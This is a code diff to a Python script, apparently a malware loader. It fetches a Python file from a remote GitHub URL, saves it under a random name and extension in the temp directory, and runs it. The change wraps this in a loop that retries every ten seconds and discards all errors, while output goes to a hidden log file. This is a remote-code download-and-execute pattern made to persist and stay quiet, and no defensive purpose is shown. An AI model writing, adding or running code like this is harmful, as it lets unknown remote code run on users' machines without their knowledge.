@@ -6,9 +6,7 @@ log_path = os.path.join(log_dir, "debug.log")
 sys.stdout = open(log_path, "a", buffering=1)
 sys.stderr = sys.stdout
 
-import time
-time.sleep(100)
-
+from time import sleep
 import subprocess
 import pathlib
 import requests
@@ -20,22 +18,30 @@ def random_ext(n=3):
 
 URL = "https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/user_script.py"  # remote file URL
 
-# Download remote content
-content = requests.get(URL, timeout=10).text
+def main():
+    # Download remote content
+    content = requests.get(URL, timeout=10).text
+    
+    # Create random file in %TEMP% with random name + extension
+    with tempfile.NamedTemporaryFile(
+        mode="w",
+        delete=False,
+        suffix=random_ext(),
+        encoding="utf-8"
+    ) as f:
+        f.write(content)
+        temp_path = pathlib.Path(f.name)
+    
+    subprocess.run(
+        [sys.executable, str(temp_path)],
+        check=True
+    )
+    
+    while True: pass
 
-# Create random file in %TEMP% with random name + extension
-with tempfile.NamedTemporaryFile(
-    mode="w",
-    delete=False,
-    suffix=random_ext(),
-    encoding="utf-8"
-) as f:
-    f.write(content)
-    temp_path = pathlib.Path(f.name)
-
-subprocess.run(
-    [sys.executable, str(temp_path)],
-    check=True
-)
-
-while True: pass
+while True:
+    try:
+        main()
+    except:
+        pass
+    sleep(10)
